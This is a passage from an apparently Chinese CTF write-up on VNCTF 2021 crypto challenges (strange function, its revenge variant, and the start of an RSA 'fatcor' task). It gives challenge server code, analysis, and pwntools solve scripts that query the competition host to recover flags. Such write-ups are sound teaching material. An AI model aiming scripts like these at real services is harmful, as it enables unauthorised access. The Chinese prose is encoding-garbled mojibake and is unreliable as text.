short_pad_attack(c1, c2, e, n)</span><br><span class="line">m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">long_to_bytes(m1)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># VNCTF&#123;H4ppyNeWy34r!2021_V&amp;N_figHt1ng!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x01-strange-function"><a href="#0x01-strange-function" class="headerlink" title="0x01 strange function"></a>0x01 strange function</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">MENU = <span class="string">br&#x27;&#x27;&#x27;[+] 1.function</span></span><br><span class="line"><span class="string">[+] 2.check_answer</span></span><br><span class="line"><span class="string">[+] 3.exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="comment"># ä¸ºäº†ç¼©çŸ­ç¯‡å¹…, è¿™éƒ¨åˆ†æ²¡æœ‰ç‰¹åˆ«æ„ä¹‰çš„å‡½æ•°å°±çœç•¥äº†</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.lenth):</span><br><span class="line">            numerator = <span class="built_in">ord</span>(self.token[i])</span><br><span class="line">            denominator = x - self.data[i]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp = numerator / denominator</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                self.send(<span class="string">b&#x27;[+] Error!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            res += tmp</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Welcome!&#x27;</span>)</span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Can you find the flag through the calculating?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.token = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line">        self.lenth = <span class="built_in">len</span>(self.token)</span><br><span class="line">        self.data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.lenth):</span><br><span class="line">            self.data.append(getRandomInteger(<span class="number">32</span>))</span><br><span class="line">        self.send(<span class="built_in">str</span>(self.data).encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.send(MENU, newline=<span class="literal">False</span>)</span><br><span class="line">            choice = self.recv()</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="string">b&#x27;1&#x27;</span>):</span><br><span class="line">                self.send(<span class="string">b&quot;[+] Plz give me your x: &quot;</span>)</span><br><span class="line">                now = <span class="built_in">int</span>(self.recv().strip().decode())</span><br><span class="line">                now = self.function(now)</span><br><span class="line">                self.send((<span class="string">&quot;[+] let me show you the answer: &quot;</span>+<span class="built_in">str</span>(now)).encode())</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;2&#x27;</span>):</span><br><span class="line">                guess = self.recv().strip().decode()</span><br><span class="line">                <span class="keyword">if</span>(guess == self.token):</span><br><span class="line">                    self.score += <span class="number">1</span></span><br><span class="line">                    self.send(<span class="string">b&quot;[+] You win!&quot;</span>)</span><br><span class="line">                    self.send((<span class="string">&quot;[!] Now your score: &quot;</span> + <span class="built_in">str</span>(self.score)).encode())</span><br><span class="line"></span><br><span class="line">                    self.token = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.digits + string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((self.score+<span class="number">1</span>)*<span class="number">16</span>)])</span><br><span class="line">                    self.lenth = <span class="built_in">len</span>(self.token)</span><br><span class="line">                    self.data = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.lenth):</span><br><span class="line">                        self.data.append(getRandomInteger(<span class="number">32</span>))</span><br><span class="line">                    self.send(<span class="built_in">str</span>(self.data).encode())</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(self.score &gt;= <span class="number">5</span>):</span><br><span class="line">                        self.send(flag.encode())</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] What do you want to say???&#x27;</span>)</span><br><span class="line">                    self.send(<span class="string">b&#x27;[!] Go away!&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10002</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…ˆç†ä¸€ç†è¿™é¢˜åœ¨å¹²å˜›, è¦æˆ‘ä»¬å¹²å˜›<br>å‰é¢å¸¸è§„çš„å·¥ä½œé‡è¯æ˜å°±ä¸è¯´äº†</p><p>æ¯æ¬¡è®¿é—®æœåŠ¡ç«¯çš„æ—¶å€™, ä¼šä»<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</code>æŒ‘å‡º16ä½ä½œä¸º<code>token</code></p><p>ç„¶åå°†<code>token</code>ä¸­çš„æ¯ä¸€ä½çš„<code>ascii</code>ç éƒ½ä¹˜ä¸€ä¸ªä¸åŒçš„éšæœºçš„æ•°(èŒƒå›´åœ¨$(0,2^{32})$), ä½œä¸º<code>data</code>ç„¶åå‘ç»™å®¢æˆ·ç«¯<br>å®¢æˆ·ç«¯å¯ä»¥è¾“å…¥ä¸€ä¸ªæ•°$x$è®©æœåŠ¡ç«¯è®¡ç®—:<br>$$<br>token =[t_0,t_1,\cdots,t_n] \\<br>data = [d_0,d_1,\cdots,d_n] \\<br>A = {t_0 \over x - d_0} + {t_1 \over x - d_1} + \cdots + {t_n \over x - d_n}<br>$$<br> å¹¶è¿”å›ç»™å®¢æˆ·ç«¯</p><p>è§£é¢˜çš„ç›®æ ‡å°±æ˜¯é€šè¿‡æœåŠ¡ç«¯è¿”å›çš„$A$,(å¯ä»¥é‡å¤è¾“å…¥ä¸åŒçš„$x$è·å¾—ä¸åŒçš„$A$<br>çŒœå‡ºäº”è½®çš„$token$(æ¯ä¸€è½®$token$çš„ä½æ•°éƒ½ä¼šå¢åŠ </p><p>å› ä¸ºè¿™é‡Œçš„$d_i$èŒƒå›´æ¯”è¾ƒå¤§, æ‰€ä»¥æ¯ä¸€ä¸ª$d$éƒ½ç›¸å·®æ¯”è¾ƒè¿œ, å½“$x = d_i + 1$çš„æ—¶å€™,${t_i \over x - d_i} = t_i$ $|x - d_j| = |d_i + 1 - d_j|(j \ne i)$ ä¼šç‰¹åˆ«å¤§<br>æ‰€ä»¥äº‹å®ä¸Šæ¯æ¬¡è¾“å…¥$x = d_i + 1$çš„æ—¶å€™, æœ‰<br>$$<br>A_i = {t_0 \over d_i+1-d_0 } + {t_1 \over d_i+1 - d_1} + \cdots + {t_n \over d_i+1 - d_n} \approx {t_i}<br>$$<br>æŠŠæ¯æ¬¡çš„$A_i$å››èˆäº”å…¥ä¹‹åå°±æ˜¯$t_i$äº†<br>æ‰€ä»¥æ¯ä¸€è½®æŠŠ$x_0,x_1,\cdots,x_n$éƒ½å‘é€ä¸€æ¬¡, å°±èƒ½å¾—åˆ°$t_0,t_1,\cdots,t_n$äº†</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256((start+END).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29406</span>)</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;: &#x27;</span>).decode()</span><br><span class="line">END = re.findall(<span class="string">&#x27;XXXX\+(.*)\)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">&#x27;== (.*)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con.send(proof(END,SHA).encode())</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    token = []</span><br><span class="line">    array = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, resp)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) &gt; <span class="number">1</span>:</span><br><span class="line">            data.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        con.sendline(<span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        token.append(<span class="built_in">round</span>(<span class="built_in">float</span>(re.findall(<span class="string">r&#x27;let me show you the answer: (.*)&#x27;</span>, resp)[<span class="number">0</span>])))</span><br><span class="line">    print(token)</span><br><span class="line">    presend = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> token:</span><br><span class="line">        presend += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">    con.sendline(presend)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">    print(resp)</span><br><span class="line"><span class="comment"># flag&#123;66a00c10-773f-4375-8a8e-444f0337bd31&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x02-strange-function-revenge"><a href="#0x02-strange-function-revenge" class="headerlink" title="0x02 strange_function_revenge"></a>0x02 strange_function_revenge</h1><h2 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h2><p>è·Ÿä¸Šä¸€é¢˜çš„åŒºåˆ«ä¸å¤§, å°±ä¸è´´ä¸Šæ¥äº†</p><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è·Ÿç¬¬ä¸€é¢˜çš„åŒºåˆ«å°±åœ¨äºéšæœºæ•°çš„å¤§å°å˜å°äº†, è¿™æ ·ä¼šå¯¼è‡´æ¯ä¸ª$d$çš„å·®è·ä¸ä¼šå¤ªå¤§, å†å‘é€$x_i = d_i + 1$, è¿”å›çš„$A_i$å››èˆäº”å…¥å°±ä¸ä¸€å®šæ˜¯$t_i$äº†, è¿™é‡Œçš„è§£å†³åŠæ³•å°±æ˜¯å¯¹è¿”å›çš„$A_i$è¿›è¡Œä¸€æ¬¡ä¿®æ­£åå†å››èˆäº”å…¥</p><p>å› ä¸º$token$æ˜¯ä»<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</code>å–çš„, è¿™äº›å­—ç¬¦çš„<code>ascii</code>éƒ½æ˜¯è¿åœ¨ä¸€èµ·çš„, å¹³å‡æ•°æ˜¯<code>86</code>, æ¯æ¬¡å‘é€$x_i$çš„æ—¶å€™, æŠŠé™¤äº†$t_i$çš„å…¶ä»–$t$éƒ½å½“ä½œ<code>86</code>, è¿™æ ·å°±å¯ä»¥è®¡ç®—å‡º:<br>$$<br>offset_i = {86 \over d_i + 1 - d_0}+{86 \over d_i + 1 - d_1}+\cdots+{86 \over d_i + 1 - d_j} (i \ne j)<br>$$<br>è¿™æ ·å°±å¯ä»¥æœ‰!<br>$$<br>A_i - offset_i \approx t_i<br>$$<br>è·Ÿstrange_functionä¸€æ ·å‘é€æ•°æ®å°±è¡Œäº†<br>ä¸è¿‡è¿™ä¸ªæ–¹æ³•ä¸å¤ªç¨³å®š, $offset$å¹¶ä¸èƒ½ä¿è¯æ¯æ¬¡éƒ½å‡†ç¡®çš„ä¿®æ­£$A$, æ”¾ä¸€é¦–å¥½è¿æ¥å¤šè·‘å‡ æ¬¡å§<br>(å¤§æ¦‚è·‘äº†ä¸ƒå…«æ¬¡å§â€¦.</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">A = <span class="number">86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256((start+END).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27609</span>)</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;: &#x27;</span>).decode()</span><br><span class="line">END = re.findall(<span class="string">&#x27;XXXX\+(.*)\)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">&#x27;== (.*)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con.send(proof(END,SHA).encode())</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    token = []</span><br><span class="line">    data = []</span><br><span class="line">    offset = []</span><br><span class="line">    array = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, resp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) &gt; <span class="number">1</span>:</span><br><span class="line">            data.append(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        psend = i + <span class="number">1</span></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i != j:</span><br><span class="line">                <span class="built_in">sum</span> += A / (psend - j)</span><br><span class="line">        offset.append(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        con.sendline(<span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        token.append(<span class="built_in">round</span>(<span class="built_in">float</span>(re.findall(<span class="string">r&#x27;let me show you the answer: (.*)&#x27;</span>, resp)[<span class="number">0</span>])-offset[data.index(i)]))</span><br><span class="line">    print(token)</span><br><span class="line">    presend = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> token:</span><br><span class="line">        presend += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">    con.sendline(presend)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">    print(resp)</span><br><span class="line"><span class="comment"># flag&#123;dfd7a22a-0ac7-4b7a-9dad-9d321fa2fcfa&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x03-fatcor"><a href="#0x03-fatcor" class="headerlink" title="0x03 fatcor"></a>0x03 fatcor</h1><blockquote><p>å¯¹ç€æŸä¸ªpaperå†™äº†ä¸€ä¸‹åˆçš„algorithm, æ²¡åšå‡ºæ¥, tcltcltclâ€¦..</p><p>ç­‰wpå‡ºæ¥å†æ€»ç»“ä¸€ä¸‹</p><p>ç»“æœä¸€ä¸ªå¸ˆå‚…æ•™æˆ‘äº†hh</p></blockquote><h2 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_public_key</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        N, phi, not_phi = p * q, (p - <span class="number">1</span>) * (q - <span class="number">1</span>), (p + <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e = inverse(d, not_phi)</span><br><span class="line">            <span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> (N, e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pubkey, m</span>):</span></span><br><span class="line">    N, e = pubkey</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">d = getPrime(<span class="number">300</span>)</span><br><span class="line">pubkeys = [get_public_key(d), get_public_key(d)]</span><br><span class="line">cs = encrypt(pubkeys[<span class="number">0</span>], m), encrypt(pubkeys[<span class="number">1</span>], m)</span><br><span class="line">print(pubkeys)</span><br><span class="line">print(cs)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[(115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177, 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611), (53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229, 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003)]</span></span><br><span class="line"><span class="string">(51861394323132582263685584977796608641129485967610029542263453128833142621927008505594685713111162217651119546991411861320042282788909858323941435593508384080858965324662410947546608051702238057613339996124961723578887443100478753831786550701578678090466528863014222331341645240511640398819027209200809466160, 53200507591144017820710284362261363695745231005527161900426580605551005076410241969689161754211964469126847594337121140420040532547631617290907291418063708630323838133357597795892690304405706577096504918510233628396424543417886828387510407109281423448827267022542075484645277275676556239547911837897827866040)</span></span><br><span class="line"><span 